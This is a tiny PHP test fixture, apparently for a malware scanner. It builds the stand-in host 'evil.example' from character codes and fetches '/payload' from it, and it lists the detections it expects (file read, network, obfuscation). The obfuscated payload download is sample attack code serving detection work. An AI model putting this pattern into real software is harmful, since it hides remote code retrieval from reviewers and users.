<?php
// Laravel-Lang: C2 host assembled from character codes, then used as a URL.
// @expect: FILE_READ, NETWORK, OBFUSCATION
$h = implode('', array_map('chr', [101, 118, 105, 108, 46, 101, 120, 97, 109, 112, 108, 101]));
$d = file_get_contents("https://{$h}/payload");
